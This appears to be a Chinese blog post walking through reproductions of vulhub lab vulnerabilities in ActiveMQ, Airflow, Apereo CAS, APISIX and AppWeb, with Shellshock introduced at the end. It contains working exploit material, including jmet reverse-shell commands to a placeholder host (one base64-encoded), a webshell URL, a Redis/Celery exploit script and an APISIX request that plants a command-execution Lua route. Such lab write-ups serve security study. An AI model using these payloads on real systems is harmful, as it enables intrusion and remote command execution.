<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  
  <meta name="author" content="sovo" />
  <meta name="description" content="" />
  
  
  <title>
    
      vulhub复现 
      
      
      |
    
     小小做题家
  </title>

  
    <link rel="apple-touch-icon" href="/images/favicon.png">
    <link rel="icon" href="/images/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a href="/">Oranges</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">vulhub复现</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2023-01-06 23:45:44
        </span>
        
      </div>
      <div class="markdown-body">
        <h1 id="vulhub复现"><a href="#vulhub复现" class="headerlink" title="vulhub复现"></a>vulhub复现</h1><h2 id="activemq"><a href="#activemq" class="headerlink" title="activemq"></a>activemq</h2><h3 id="CVE-2015-5254"><a href="#CVE-2015-5254" class="headerlink" title="CVE-2015-5254"></a>CVE-2015-5254</h3><h4 id="ActiveMQ是什么？"><a href="#ActiveMQ是什么？" class="headerlink" title="ActiveMQ是什么？"></a>ActiveMQ是什么？</h4><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/79264007">https://zhuanlan.zhihu.com/p/79264007</a></p>
<p>ActiveMQ 是 Apache 出品，最流行的，能力强劲的开源消息总线。ActiveMQ 是一个 完全支持 JMS1.1 和 J2EE 1.4 规范的 JMS Provider 实现，尽管 JMS 规范出台已经是很久 的事情了，但是 JMS 在当今的 J2EE 应用中间仍然扮演着特殊的地位。</p>
<p>LICENSE  NOTICE  README.txt  activemq-all-5.11.1.jar  bin  conf  data  docs  examples  lib  tmp  webapps  webapps-demo</p>
<h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><p>环境运行后，将监听61616和8161两个端口其中61616是工作端口，消息在这个端口进行传递;8161是网络管理页面端口访问<a href="http://192.168.1.120:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。默认的用户名/密码为admin/admin">http://192.168.1.120:8161即可看到网络管理页面，不过这个漏洞理论上是不需要网络的。默认的用户名/密码为admin/admin</a>)</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/ff97801964cf1ba1c11b82c363117292.png" class="" title="ff97801964cf1ba1c11b82c363117292.png">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220820222920265.png" class="" title="image-20220820222920265">

<h4 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h4><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220821180440522.png" class="" title="image-20220821180440522">

<p>工具jmet<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">https://github.com/matthiaskaiser/jmet</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/sucess&quot; -Yp ROME 192.168.1.120 61616<br></code></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event">http://127.0.0.1:8161/admin/browse.jsp?JMSDestination=event</a></p>
<p>点击event即可导致touch  &#x2F;tmp&#x2F;sucess成功执行</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220821181004286.png" class="" title="image-20220821181004286">

<p>反弹shell命令</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">java -jar jmet-<span class="hljs-number">0.1</span>.<span class="hljs-number">0</span>-<span class="hljs-keyword">all</span>.jar -Q event -I ActiveMQ -s -Y <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/12345 0&gt;&amp;1&quot;</span> -Yp ROME <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">61616</span><br>//这条命令无法反弹<span class="hljs-keyword">shell</span>，可能是被拦截了，经实验 base64后可以反弹<span class="hljs-keyword">shell</span><br>java -jar jmet-<span class="hljs-number">0.1</span>.<span class="hljs-number">0</span>-<span class="hljs-keyword">all</span>.jar -Q event -I ActiveMQ -s -Y <span class="hljs-string">&quot;bash -c &#123;echo,base64数据&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> -Yp ROME <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> <span class="hljs-number">61616</span><br></code></pre></td></tr></table></figure>

<p>服务器监听端口</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span>  -lnvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220821185255258.png" class="" title="image-20220821185255258">

<h4 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h4><p>需要管理员&#x2F;用户的点击</p>
<h3 id="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h3><p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作</p>
<p>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf&#x2F;jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用。</p>
<h4 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h4><p>查看activeMQ的绝对路径</p>
<p><a target="_blank" rel="noopener" href="http://192.168.1.120:8161/admin/test/systemProperties.jsp">http://192.168.1.120:8161/admin/test/systemProperties.jsp</a></p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824132419605.png" class="" title="image-20220824132419605">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141107422.png" class="" title="image-20220824141107422">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141140284.png" class="">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://192.168.1.120:8161/api/shell.jsp?<span class="hljs-built_in">pwd</span>=admin&amp;cmd=<span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141205632.png" class="">

<h4 id="写入crontab，自动化弹shell"><a href="#写入crontab，自动化弹shell" class="headerlink" title="写入crontab，自动化弹shell"></a>写入crontab，自动化弹shell</h4><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141518879.png" class="" title="image-20220824141518879">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824141530351.png" class="" title="image-20220824141530351">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824143026152.png" class="" title="image-20220824143026152">

<h2 id="airflow"><a href="#airflow" class="headerlink" title="airflow"></a>airflow</h2><h3 id="CVE-2020-11978"><a href="#CVE-2020-11978" class="headerlink" title="CVE-2020-11978"></a>CVE-2020-11978</h3><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前的示例DAG中存在一处命令注入漏洞，未授权的访问者可以通过这个漏洞在Worker中执行任意命令。</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824160928813.png" class="" title="image-20220824160928813">

<p>开启功能</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161016117.png" class="" title="image-20220824161016117">

<p>点击进入</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161232722.png" class="" title="image-20220824161232722">

<p>输入</p>
<p>{“message”:”‘&quot;;touch &#x2F;tmp&#x2F;airflow_dag_success;#”}</p>
<p>点击Trigger</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161336914.png" class="" title="image-20220824161336914">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161420233.png" class="" title="image-20220824161420233">

<p>执行成功</p>
<p>进入容器查看命令是否执行</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824161821777.png" class="" title="image-20220824161821777">

<h3 id="CVE-2020-11981"><a href="#CVE-2020-11981" class="headerlink" title="CVE-2020-11981"></a>CVE-2020-11981</h3><p>Apache Airflow是一款开源的，分布式任务调度框架。在其1.10.10版本及以前，如果攻击者控制了Celery的消息中间件（如Redis&#x2F;RabbitMQ），将可以通过控制消息，在Worker进程中执行任意命令。</p>
<p>利用这个漏洞需要控制消息中间件，Vulhub环境中Redis存在未授权访问。通过未授权访问，攻击者可以下发自带的任务<code>airflow.executors.celery_executor.execute_command</code>来执行任意命令，参数为命令执行中所需要的数组。</p>
<p>我们可以使用<a href="exploit_airflow_celery.py">exploit_airflow_celery.py</a>这个小脚本来执行命令<code>touch /tmp/airflow_celery_success</code>：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">pip install redispython exploit_airflow_celery<span class="hljs-selector-class">.py</span> <span class="hljs-selector-attr">[your-ip]</span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824162607716.png" class="" title="image-20220824162607716">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> redis<br><span class="hljs-keyword">import</span> sys<br>r = redis.Redis(host=sys.argv[<span class="hljs-number">1</span>], port=<span class="hljs-number">6379</span>, decode_responses=<span class="hljs-literal">True</span>,db=<span class="hljs-number">0</span>) <br>queue_name = <span class="hljs-string">&#x27;default&#x27;</span><br>ori_str=<span class="hljs-string">&quot;&#123;\&quot;content-encoding\&quot;: \&quot;utf-8\&quot;, \&quot;properties\&quot;: &#123;\&quot;priority\&quot;: 0, \&quot;delivery_tag\&quot;: \&quot;f29d2b4f-b9d6-4b9a-9ec3-029f9b46e066\&quot;, \&quot;delivery_mode\&quot;: 2, \&quot;body_encoding\&quot;: \&quot;base64\&quot;, \&quot;correlation_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;delivery_info\&quot;: &#123;\&quot;routing_key\&quot;: \&quot;celery\&quot;, \&quot;exchange\&quot;: \&quot;\&quot;&#125;, \&quot;reply_to\&quot;: \&quot;fb996eec-3033-3c10-9ee1-418e1ca06db8\&quot;&#125;, \&quot;content-type\&quot;: \&quot;application/json\&quot;, \&quot;headers\&quot;: &#123;\&quot;retries\&quot;: 0, \&quot;lang\&quot;: \&quot;py\&quot;, \&quot;argsrepr\&quot;: \&quot;(100, 200)\&quot;, \&quot;expires\&quot;: null, \&quot;task\&quot;: \&quot;airflow.executors.celery_executor.execute_command\&quot;, \&quot;kwargsrepr\&quot;: \&quot;&#123;&#125;\&quot;, \&quot;root_id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;parent_id\&quot;: null, \&quot;id\&quot;: \&quot;ed5f75c1-94f7-43e4-ac96-e196ca248bd4\&quot;, \&quot;origin\&quot;: \&quot;gen1@132f65270cde\&quot;, \&quot;eta\&quot;: null, \&quot;group\&quot;: null, \&quot;timelimit\&quot;: [null, null]&#125;, \&quot;body\&quot;: \&quot;W1sxMDAsIDIwMF0sIHt9LCB7ImNoYWluIjogbnVsbCwgImNob3JkIjogbnVsbCwgImVycmJhY2tzIjogbnVsbCwgImNhbGxiYWNrcyI6IG51bGx9XQ==\&quot;&#125;&quot;</span><br>task_dict = json.loads(ori_str)<br>command = [<span class="hljs-string">&#x27;touch&#x27;</span>, <span class="hljs-string">&#x27;/tmp/airflow_celery_success&#x27;</span>]<br>body=[[command], &#123;&#125;, &#123;<span class="hljs-string">&quot;chain&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;chord&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;errbacks&quot;</span>: <span class="hljs-literal">None</span>, <span class="hljs-string">&quot;callbacks&quot;</span>: <span class="hljs-literal">None</span>&#125;]<br>task_dict[<span class="hljs-string">&#x27;body&#x27;</span>]=base64.b64encode(json.dumps(body).encode()).decode()<br><span class="hljs-built_in">print</span>(task_dict)<br>r.lpush(queue_name,json.dumps(task_dict))<br><br></code></pre></td></tr></table></figure>

<p>base64</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;touch&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/tmp/airflow_celery_success&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;chain&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;chord&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;errbacks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;callbacks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><br></code></pre></td></tr></table></figure>

<h3 id="CVE-2020-17526"><a href="#CVE-2020-17526" class="headerlink" title="CVE-2020-17526"></a>CVE-2020-17526</h3><p>Apache Airflow是一款开源的，分布式任务调度框架。默认情况下，Apache Airflow无需用户认证，但管理员也可以通过指定<code>webserver.authenticate=True</code>来开启认证。</p>
<p>在其1.10.13版本及以前，即使开启了认证，攻击者也可以通过一个默认密钥来绕过登录，伪造任意用户。</p>
<p>获取初始session</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -v http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/admin/</span>airflow/login<br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824185850862.png" class="" title="image-20220824185850862">

<p>利用<a target="_blank" rel="noopener" href="https://github.com/Paradoxis/Flask-Unsign">flask-unsign</a>解密私钥</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824185934521.png" class="" title="image-20220824185934521">

<p>利用解出的私钥伪造session</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824190007905.png" class="" title="image-20220824190007905">

<p>修改session,进入页面</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824190035956.png" class="" title="image-20220824190035956">

<h2 id="Apereo-CAS-4-1-反序列化命令执行漏洞"><a href="#Apereo-CAS-4-1-反序列化命令执行漏洞" class="headerlink" title="Apereo CAS 4.1 反序列化命令执行漏洞"></a>Apereo CAS 4.1 反序列化命令执行漏洞</h2><p>Apereo CAS是一款Apereo发布的集中认证服务平台，常被用于企业内部单点登录系统。其4.1.7版本之前存在一处默认密钥的问题，利用这个默认密钥我们可以构造恶意信息触发目标反序列化漏洞，进而执行任意命令。</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public <span class="hljs-keyword">class</span> EncryptedTranscoder implements Transcoder &#123;<br>    <span class="hljs-keyword">private</span> CipherBean cipherBean;<br>    <span class="hljs-keyword">private</span> boolean compression = <span class="hljs-literal">true</span>;<br><br>    public <span class="hljs-constructor">EncryptedTranscoder()</span> throws IOException &#123;<br>        BufferedBlockCipherBean bufferedBlockCipherBean = <span class="hljs-keyword">new</span> <span class="hljs-constructor">BufferedBlockCipherBean()</span>;<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">BlockCipherSpec(<span class="hljs-params">new</span> BufferedBlockCipherSpec(<span class="hljs-string">&quot;AES&quot;</span>, <span class="hljs-string">&quot;CBC&quot;</span>, <span class="hljs-string">&quot;PKCS7&quot;</span>)</span>);<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">KeyStore(<span class="hljs-params">this</span>.<span class="hljs-params">createAndPrepareKeyStore</span>()</span>);<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">KeyAlias(<span class="hljs-string">&quot;aes128&quot;</span>)</span>;<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">KeyPassword(<span class="hljs-string">&quot;changeit&quot;</span>)</span>;<br>        bufferedBlockCipherBean.set<span class="hljs-constructor">Nonce(<span class="hljs-params">new</span> RBGNonce()</span>);<br>        this.set<span class="hljs-constructor">CipherBean(<span class="hljs-params">bufferedBlockCipherBean</span>)</span>;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>随便输入账号密码点击login</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223009720.png" class="" title="image-20220824223009720">

<p>burp抓包</p>
<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223042288.png" class="" title="image-20220824223042288">

<p>execution部分经工具<a target="_blank" rel="noopener" href="https://github.com/vulhub/Apereo-CAS-Attack">Apereo-CAS-Attack</a>。使用ysoserial的CommonsCollections4生成加密后的Payload：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar apereo-cas-attack-<span class="hljs-number">1</span>.<span class="hljs-number">0</span>-SNAPSHOT-<span class="hljs-literal">all</span>.jar CommonsCollections4 <span class="hljs-string">&quot;此处可反弹shell&quot;</span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223258998.png" class="" title="image-20220824223258998">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223328390.png" class="" title="image-20220824223328390">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220824223411190.png" class="" title="image-20220824223411190">

<h2 id="apisix"><a href="#apisix" class="headerlink" title="apisix"></a>apisix</h2><h3 id="Apache-APISIX-默认密钥漏洞（CVE-2020-13945）"><a href="#Apache-APISIX-默认密钥漏洞（CVE-2020-13945）" class="headerlink" title="Apache APISIX 默认密钥漏洞（CVE-2020-13945）"></a>Apache APISIX 默认密钥漏洞（CVE-2020-13945）</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/apisix/admin/routes</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>your-ip:9080<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">X-API-KEY</span><span class="hljs-punctuation">: </span>edd1c9f034335f136f87ad84b625c8f1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>406<br><br><span class="language-swift">&#123;</span><br><span class="language-swift">    <span class="hljs-string">&quot;uri&quot;</span>: <span class="hljs-string">&quot;/attack&quot;</span>,</span><br><span class="language-swift"><span class="hljs-string">&quot;script&quot;</span>: <span class="hljs-string">&quot;local _M = &#123;&#125; <span class="hljs-subst">\n</span> function _M.access(conf, ctx) <span class="hljs-subst">\n</span> local os = require(&#x27;os&#x27;)<span class="hljs-subst">\n</span> local args = assert(ngx.req.get_uri_args()) <span class="hljs-subst">\n</span> local f = assert(io.popen(args.cmd, &#x27;r&#x27;))<span class="hljs-subst">\n</span> local s = assert(f:read(&#x27;*a&#x27;))<span class="hljs-subst">\n</span> ngx.say(s)<span class="hljs-subst">\n</span> f:close()  <span class="hljs-subst">\n</span> end <span class="hljs-subst">\n</span>return _M&quot;</span>,</span><br><span class="language-swift">    <span class="hljs-string">&quot;upstream&quot;</span>: &#123;</span><br><span class="language-swift">        <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;roundrobin&quot;</span>,</span><br><span class="language-swift">        <span class="hljs-string">&quot;nodes&quot;</span>: &#123;</span><br><span class="language-swift">            <span class="hljs-string">&quot;example.com:80&quot;</span>: <span class="hljs-number">1</span></span><br><span class="language-swift">        &#125;</span><br><span class="language-swift">    &#125;</span><br><span class="language-swift">&#125;</span><br></code></pre></td></tr></table></figure>

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825002507937.png" class="" title="image-20220825002507937">

<h2 id="appweb"><a href="#appweb" class="headerlink" title="appweb"></a>appweb</h2><h3 id="CVE-2018-8715"><a href="#CVE-2018-8715" class="headerlink" title="CVE-2018-8715"></a>CVE-2018-8715</h3><p>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C&#x2F;C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p>
<p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p>
<ul>
<li>basic 传统HTTP基础认证</li>
<li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li>
<li>form 表单认证</li>
</ul>
<p>其7.0.3之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为<code>null</code>（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</p>
<p>逻辑漏洞</p>
<h4 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h4><img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825113650439.png" class="" title="image-20220825113650439">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825114054033.png" class="" title="image-20220825114054033">

<img src="/2023/01/02/vulhub%E5%A4%8D%E7%8E%B0/image-20220825114207682.png" class="" title="image-20220825114207682">

<h2 id="Aria2-任意文件写入漏洞"><a href="#Aria2-任意文件写入漏洞" class="headerlink" title="Aria2 任意文件写入漏洞"></a>Aria2 任意文件写入漏洞</h2><p>Aria2是一款<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E8%87%AA%E7%94%B1%E8%BD%AF%E4%BB%B6">自由</a>、<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E8%B7%A8%E5%B9%B3%E5%8F%B0">跨平台</a><a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%95%8C%E9%9D%A2">命令行界面</a>的<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E4%B8%8B%E8%BD%BD%E7%AE%A1%E7%90%86%E5%99%A8">下载管理器</a>，该软件根据<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/GPLv2">GPLv2</a><a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF%E8%AF%81">许可证</a>进行分发。支持的下载协议有：<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/HTTP">HTTP</a>、<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/HTTPS">HTTPS</a>、<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/FTP">FTP</a>、<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/wiki/BitTorrent_(%E5%8D%8F%E8%AE%AE)">Bittorrent</a>和<a target="_blank" rel="noopener" href="https://zh.m.wikipedia.org/w/index.php?title=Metalink&action=edit&redlink=1">Metalink</a></p>
<p>复现出现了问题</p>
<h2 id="Bash-Shellshock-破壳漏洞（CVE-2014-6271）"><a href="#Bash-Shellshock-破壳漏洞（CVE-2014-6271）" class="headerlink" title="Bash Shellshock 破壳漏洞（CVE-2014-6271）"></a>Bash Shellshock 破壳漏洞（CVE-2014-6271）</h2><p><a target="_blank" rel="noopener" href="https://www.antiy.com/response/CVE-2014-6271.html">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>该Bash使用的环境变量是通过函数名称来调用的，导致漏洞是以<code>()&#123;</code>开头定义的环境变量在命令env中解析成函数后，bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h3><p>服务启动后，有两个页面<code>http://your-ip:8080/victim.cgi</code>和<code>http://your-ip:8080/safe.cgi</code>。其中safe.cgi是最新版bash生成的页面，victim.cgi是bash4.3生成的页面。</p>
<p>victim.cgi</p>
